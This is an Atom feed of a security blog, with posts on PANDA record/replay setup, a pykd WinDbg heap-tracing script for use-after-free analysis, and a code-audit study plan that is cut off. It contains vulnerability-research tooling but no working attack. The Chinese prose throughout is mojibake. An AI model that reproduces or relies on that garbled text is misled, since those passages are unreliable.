<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>o0xmuhe&#39;s blog</title>
  <subtitle>ä¸€ä¸ªæœ‰æƒ…æ€€çš„äºŒè¿›åˆ¶ç‹—</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://o0xmuhe.me/"/>
  <updated>2018-11-08T04:33:19.015Z</updated>
  <id>http://o0xmuhe.me/</id>
  
  <author>
    <name>muhe</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello PANDA</title>
    <link href="http://o0xmuhe.me/2018/11/08/Hello-PANDA/"/>
    <id>http://o0xmuhe.me/2018/11/08/Hello-PANDA/</id>
    <published>2018-11-08T04:15:43.000Z</published>
    <updated>2018-11-08T04:33:19.015Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0-Environment"><a href="#0-Environment" class="headerlink" title="0. Environment"></a>0. Environment</h4><p>Ubuntu16.04 x64</p>
<a id="more"></a>
<h4 id="1-Install-Panda"><a href="#1-Install-Panda" class="headerlink" title="1. Install Panda"></a>1. Install Panda</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/moyix/panda.git</span><br><span class="line"><span class="built_in">cd</span> panda</span><br><span class="line">./panda_install.bash</span><br></pre></td></tr></table></figure>
<h4 id="2-Working-Folder-and-HDD"><a href="#2-Working-Folder-and-HDD" class="headerlink" title="2. Working Folder and HDD"></a>2. Working Folder and HDD</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir my_first_panda</span><br><span class="line">$ <span class="built_in">cd</span> my_first_panda</span><br><span class="line">$ ../qemu/qemu-img create <span class="_">-f</span> qcow2 test.img 32G</span><br></pre></td></tr></table></figure>
<h4 id="3-Boot-VM"><a href="#3-Boot-VM" class="headerlink" title="3. Boot VM"></a>3. Boot VM</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024</span><br></pre></td></tr></table></figure>
<p>you will get:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âœ  my_first_panda git:(master) âœ— ../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024</span><br><span class="line"></span><br><span class="line">(process:21836): GLib-WARNING **: /build/glib2.0-7ZsPUq/glib2.0-2.48.2/./glib/gmem.c:483: custom memory allocation vtable not supported</span><br><span class="line">QEMU 1.0,1 monitor - <span class="built_in">type</span> <span class="string">'help'</span> <span class="keyword">for</span> more information</span><br><span class="line">(qemu) change ide1-cd0 win_server_2008_r2.iso </span><br><span class="line">(qemu)</span><br></pre></td></tr></table></figure>
<p>mount your iso file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(qemu) change ide1-cd0 win_server_2008_r2.iso </span><br><span class="line">(qemu)</span><br></pre></td></tr></table></figure>
<h4 id="4-Install-OS"><a href="#4-Install-OS" class="headerlink" title="4. Install OS"></a>4. Install OS</h4><p>Connect your vm with a VNC client, press <code>ctrl + opt + del</code>(on macOS) / <code>ctrl + alt + del</code>(on Windows) to reboot your vm,then you are able to install the OS.</p>
<h4 id="5-Record-Replay-with-PANDA"><a href="#5-Record-Replay-with-PANDA" class="headerlink" title="5. Record/Replay with PANDA"></a>5. Record/Replay with PANDA</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(qemu) begin_record <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>â€¦.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(qemu) end_record</span><br></pre></td></tr></table></figure>
<p>now you can replay (with replay movie plugin)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../qemu/x86_64-softmmu/qemu-system-x86_64 -replay <span class="built_in">test</span> -panda replaymovie -m 2048</span><br></pre></td></tr></table></figure>
<p>other plugins? Taint?cov?  :)</p>
<h4 id="6-Reference"><a href="#6-Reference" class="headerlink" title="6. Reference"></a>6. Reference</h4><p><a href="https://gist.github.com/bridgeythegeek/d7a6c449287c6e32187be2639a7920bf" target="_blank" rel="noopener">My first panda</a></p>
<p><a href="https://github.com/panda-re/panda/blob/master/panda/plugins/callstack_instr/USAGE.md" target="_blank" rel="noopener">Panda Usage</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0-Environment&quot;&gt;&lt;a href=&quot;#0-Environment&quot; class=&quot;headerlink&quot; title=&quot;0. Environment&quot;&gt;&lt;/a&gt;0. Environment&lt;/h4&gt;&lt;p&gt;Ubuntu16.04 x64&lt;/p&gt;
    
    </summary>
    
    
      <category term="PANDA" scheme="http://o0xmuhe.me/tags/PANDA/"/>
    
      <category term="RE" scheme="http://o0xmuhe.me/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>UAF analysis : using pykd</title>
    <link href="http://o0xmuhe.me/2018/11/07/UAF-analysis-using-pykd/"/>
    <id>http://o0xmuhe.me/2018/11/07/UAF-analysis-using-pykd/</id>
    <published>2018-11-07T09:52:40.000Z</published>
    <updated>2018-11-07T10:05:16.607Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01 : ç®€ä»‹"></a>0x01 : ç®€ä»‹</h4><p>åˆ†æä¸€äº›æƒ…å†µæ¯”è¾ƒå¤æ‚çš„UAFæ¼æ´æ—¶ï¼Œæ¯”å¦‚å¾ˆå¤šæ¬¡åˆ†é…ã€ä½¿ç”¨å†…å­˜ï¼Œè´¹åŠ›å¯»æ‰¾è¢«UAFçš„å¯¹è±¡çš„é‡Šæ”¾ç‚¹ï¼Œæ˜¯æ¯”è¾ƒéº»çƒ¦çš„(å¯¹äºæˆ‘è¿™ç§èœé€¼æ¥è¯´)ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨pykdæ¥è¾…åŠ©è¿™ä¸ªå·¥ä½œï¼Œèƒ½ä½¿å¾—æ¼æ´åˆ†æå·¥ä½œå˜å¾—æ›´è½»æ¾ã€‚ </p>
<a id="more"></a>
<h4 id="0x02-è„šæœ¬æ¨¡ç‰ˆ"><a href="#0x02-è„šæœ¬æ¨¡ç‰ˆ" class="headerlink" title="0x02 : è„šæœ¬æ¨¡ç‰ˆ"></a>0x02 : è„šæœ¬æ¨¡ç‰ˆ</h4><p>è¿™ä¸ªè„šæœ¬çš„<a href="https://labs.mwrinfosecurity.com/blog/heap-tracing-with-windbg-and-python/" target="_blank" rel="noopener">åŸå§‹ç‰ˆæœ¬</a>åœ¨ä½¿ç”¨çš„æ—¶å€™æœ‰ç‚¹é—®é¢˜ï¼Œæˆ‘æœ¬åœ°æµ‹è¯•çš„æ—¶å€™å›è°ƒå‡½æ•°æœ‰ç‚¹é—®é¢˜ï¼Œä¸èƒ½æ­£å¸¸ä½¿ç”¨ã€‚</p>
<p>åæ¥å’¨è¯¢äº†æ— è¨€å­¦é•¿ä¹‹åï¼Œå­¦é•¿å¸®å¿™åšäº†ä¿®æ”¹:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pykd</span><br><span class="line"></span><br><span class="line">return_reg = <span class="string">"rax"</span></span><br><span class="line">stack_pointer = <span class="string">"rsp"</span></span><br><span class="line">arch_bits = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(localAddr)</span>:</span></span><br><span class="line">    res = pykd.dbgCommand(<span class="string">"x "</span> + localAddr)</span><br><span class="line">    result_count = res.count(<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> result_count == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> localAddr + <span class="string">" not found."</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> result_count &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] Warning, more than one result for"</span>, localAddr</span><br><span class="line">    <span class="keyword">return</span> res.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlAllocateHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags,</span></span><br><span class="line"><span class="comment"># IN ULONG                Size );</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_allocate_heap</span><span class="params">(pykd.eventHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        addr = get_address(<span class="string">"ntdll!RtlAllocateHeap"</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(int(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.out = <span class="string">"RtlAllocateHeap("</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0xC</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rcx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rdx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r8"</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="keyword">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">"uf ntdll!RtlAllocateHeap"</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(int(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        pykd.dprintln(self.out + hex(pykd.reg(return_reg)) + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlFreeHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags OPTIONAL,</span></span><br><span class="line"><span class="comment"># IN PVOID                MemoryPointer );</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_free_heap</span><span class="params">(pykd.eventHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        addr = get_address(<span class="string">"ntdll!RtlFreeHeap"</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(int(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.out = <span class="string">"RtlFreeHeap("</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">0xC</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rcx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rdx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r8"</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="keyword">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">"uf ntdll!RtlFreeHeap"</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(int(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># returns a BOOLEAN which is a byte under the hood</span></span><br><span class="line">        ret_val = hex(pykd.reg(<span class="string">"al"</span>))</span><br><span class="line">        pykd.dprintln(self.out + ret_val + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlReAllocateHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags,</span></span><br><span class="line"><span class="comment"># IN PVOID                MemoryPointer,</span></span><br><span class="line"><span class="comment"># IN ULONG                Size );</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_realloc_heap</span><span class="params">(pykd.eventHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        addr = get_address(<span class="string">"ntdll!RtlReAllocateHeap"</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(int(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.out = <span class="string">"RtlReAllocateHeap("</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">0xC</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x10</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rcx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rdx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r8"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r9"</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="keyword">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">"uf ntdll!RtlReAllocateHeap"</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(int(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        pykd.dprintln(self.out + hex(pykd.reg(return_reg)) + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pykd.reg(<span class="string">"rax"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    arch_bits = <span class="number">32</span></span><br><span class="line">    return_reg = <span class="string">"eax"</span></span><br><span class="line">    stack_pointer = <span class="string">"esp"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#addr = get_address("ntdll!RtlReAllocateHeap")</span></span><br><span class="line"><span class="comment">#print addr</span></span><br><span class="line"></span><br><span class="line">pykd.removeAllBp()</span><br><span class="line">bp_a1 = handle_allocate_heap()</span><br><span class="line">bp_a2 = handle_free_heap()</span><br><span class="line">bp_a3 = handle_realloc_heap()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'bps=%x'</span> %pykd.getNumberBreakpoints()</span><br></pre></td></tr></table></figure>
<p>æˆ‘åŸºäºè¿™äº›æ¨¡ç‰ˆï¼Œå†™äº†è‡ªå·±åšæ¼æ´åˆ†æçš„æ—¶å€™ä½¿ç”¨çš„è„šæœ¬ã€‚ æ€è·¯ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯æ‰¾åˆ°ç›®æ ‡å¯¹è±¡çš„åˆ†é…ã€é‡Šæ”¾ç‚¹ï¼Œä¸‹æ–­ç‚¹ï¼Œè‡ªåŠ¨è®°å½•åˆ†é…/é‡Šæ”¾çš„å†…å­˜åœ°å€ã€å¤§å°ï¼Œç„¶ååšä¸€ä¸ªè¾“å‡ºä¾›è‡ªå·±åˆ†æç”¨ã€‚</p>
<p>æ•ˆæœå½“ç„¶æ˜¯å¾ˆèˆ’æœå•¦  :)</p>
<h4 id="0x03-ä½¿ç”¨æ•ˆæœ"><a href="#0x03-ä½¿ç”¨æ•ˆæœ" class="headerlink" title="0x03 : ä½¿ç”¨æ•ˆæœ"></a>0x03 : ä½¿ç”¨æ•ˆæœ</h4><p>ç›®æ ‡æ˜¯å¤§å‹è½¯ä»¶æ—¶ï¼Œwindbgä¼šæœ‰ç‚¹å¡ï¼Œç­‰ä¸€ä¸‹å°±å¥½äº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; .load pykd</span><br><span class="line">&gt; !py -g path/to/script.py</span><br><span class="line">&gt; g</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x276fbff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26af2ff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x27657ff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1cff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x26f1aff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257aaff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257bcff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x2694aff0</span><br><span class="line"></span><br><span class="line">RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x255cfff0</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x255cfff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x2694aff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x257bcff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x257aaff0L) = 0x1</span><br><span class="line"></span><br><span class="line">RtlFreeHeap(0x950000L , 0x0L , 0x26f1aff0L) = 0x1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x01-ç®€ä»‹&quot;&gt;&lt;a href=&quot;#0x01-ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;0x01 : ç®€ä»‹&quot;&gt;&lt;/a&gt;0x01 : ç®€ä»‹&lt;/h4&gt;&lt;p&gt;åˆ†æä¸€äº›æƒ…å†µæ¯”è¾ƒå¤æ‚çš„UAFæ¼æ´æ—¶ï¼Œæ¯”å¦‚å¾ˆå¤šæ¬¡åˆ†é…ã€ä½¿ç”¨å†…å­˜ï¼Œè´¹åŠ›å¯»æ‰¾è¢«UAFçš„å¯¹è±¡çš„é‡Šæ”¾ç‚¹ï¼Œæ˜¯æ¯”è¾ƒéº»çƒ¦çš„(å¯¹äºæˆ‘è¿™ç§èœé€¼æ¥è¯´)ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨pykdæ¥è¾…åŠ©è¿™ä¸ªå·¥ä½œï¼Œèƒ½ä½¿å¾—æ¼æ´åˆ†æå·¥ä½œå˜å¾—æ›´è½»æ¾ã€‚ &lt;/p&gt;
    
    </summary>
    
    
      <category term="vuln analysis" scheme="http://o0xmuhe.me/tags/vuln-analysis/"/>
    
      <category term="uaf" scheme="http://o0xmuhe.me/tags/uaf/"/>
    
  </entry>
  
  <entry>
    <title>ä»£ç å®¡è®¡åŸ¹å…»è®¡åˆ’</title>
    <link href="http://o0xmuhe.me/2018/10/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%B9%E5%85%BB%E8%AE%A1%E5%88%92/"/>
    <id>http://o0xmuhe.me/2018/10/05/ä»£ç å®¡è®¡åŸ¹å…»è®¡åˆ’/</id>
    <published>2018-10-05T12:53:52.000Z</published>
    <updated>2018-10-22T08:15:14.316Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-ä¸ºä»€ä¹ˆè¦æè¿™ä¸ª"><a href="#0x00-ä¸ºä»€ä¹ˆè¦æè¿™ä¸ª" class="headerlink" title="0x00 : ä¸ºä»€ä¹ˆè¦æè¿™ä¸ª"></a>0x00 : ä¸ºä»€ä¹ˆè¦æè¿™ä¸ª</h4><p>å› ä¸ºæˆ‘èœå•Šï¼Œè€Œä¸”æˆ‘æƒ³å­¦ä»£ç å®¡è®¡å•Šã€‚</p>
<a id="more"></a>
<h4 id="0x01-ç¬¬ä¸€æ­¥"><a href="#0x01-ç¬¬ä¸€æ­¥" class="headerlink" title="0x01 : ç¬¬ä¸€æ­¥"></a>0x01 : ç¬¬ä¸€æ­¥</h4><p>å…ˆæ‰¾ç‚¹ä»£ç æ¥è¯»ä¸€è¯»ï¼Œå­¦ä¹ ä¸€ä¸‹ï¼ŒåŸ¹å…»ä¸‹ä»£ç é˜…è¯»èƒ½åŠ›å•¥çš„ã€‚</p>
<h5 id="è„šæœ¬å¼•æ“"><a href="#è„šæœ¬å¼•æ“" class="headerlink" title="è„šæœ¬å¼•æ“"></a>è„šæœ¬å¼•æ“</h5><ul>
<li>tiny js </li>
</ul>
<p>just a demo0 </p>
<p><a href="https://github.com/gfwilliams/tiny-js.git" target="_blank" rel="noopener">https://github.com/gfwilliams/tiny-js.git</a></p>
<ul>
<li>jerryscript </li>
</ul>
<p>ECMS 5.1 </p>
